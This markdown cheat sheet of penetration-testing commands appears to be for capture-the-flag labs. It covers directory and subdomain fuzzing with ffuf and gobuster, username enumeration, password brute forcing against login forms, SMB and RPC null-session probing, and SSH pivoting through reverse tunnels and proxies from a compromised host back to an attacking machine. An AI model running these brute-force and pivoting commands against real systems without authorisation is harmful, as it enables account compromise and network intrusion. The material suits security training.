# CONTENT DISCOVERY :

## DIRECTORIES
### Brute Forcing using ffuf, dirbuster, and gobuster
`ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ`
Here, *FUZZ* is replaced by the directory name from the wordlist.

`dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

`gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

## SUBDOMAINS:
### Using OSINT:
[Gather CT(Certificate Transparency) logs](https://crt.sh/)

### Using ffuf:
`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP`

Above command will always produce a valid result, hence the output needs to be filtered.
 Edit the below command replacing {size} with the most occurring size value from the previous result
 `ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs {size}`

# AUTHENTICATION BYPASS
### USERNAME ENUMERATION:
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"`

`-H` : Specified headers for the request 
`-mr`:  Text on the page we are looking for to validate we've found a valid username

### BRUTE FORCE LOGIN
`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200`

`-fc` : To check for an HTTP status code other than 200.

`ffuf -w /usr/share/wordlists/Seclists/usernames_common.txt -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded"`

# BASIC ENUMERATION

`curl --head <IP>` : Grab website header; potential verion information.
`nikto -host <IP>` : Potential Vulnerability list.
`rpcclient -U "" <IP>` : RPC Null session.
`smbclient -L \\\\<IP>` : Try connecting to possible shares.
> If meterpreter shell breaks, consider changing the shell.

# SSH:
## PORT FORWARDING

> `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`

Let's say you have SSH access to `172.16.0.5` The above command creates a forward SSH tunnel (_80 on the target server, and port 8000 on our own machine_), giving access to a webserver running on `172.16.0.10`.
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine_.
`-f` Backgounds the Shell
`-N` Tells SSH that it doesn't need to execute any commands

## REVERSE CONNECTIONS

This is preferable if you have a shell on the compromised server, but not SSH access.

> Generate ssh keys using `ssh-keygen`.
> 1. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.
> 2. On a new line, type the following line, then paste in the public key:  
        `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`  
        This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
> 3. Check if the SSH server on your attacking machine is running:  
        `sudo systemctl status ssh`. If not, start the service: `sudo systemctl start ssh`.
> 4. Finally, transfer the private key to the target box.
> 5. Connect back to the attacking machine:
>    `ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`


## PROXIES

The following command will open up port 1337 on the attacking box as a proxy to send data through into the protected network.
> `ssh -D 1337 USERNAME@ATTACKING_IP -fN`

Some newer versions of SSH allow reverse proxies. The following command can be used to create a reverse proxy in clients which do support it:
> `ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`
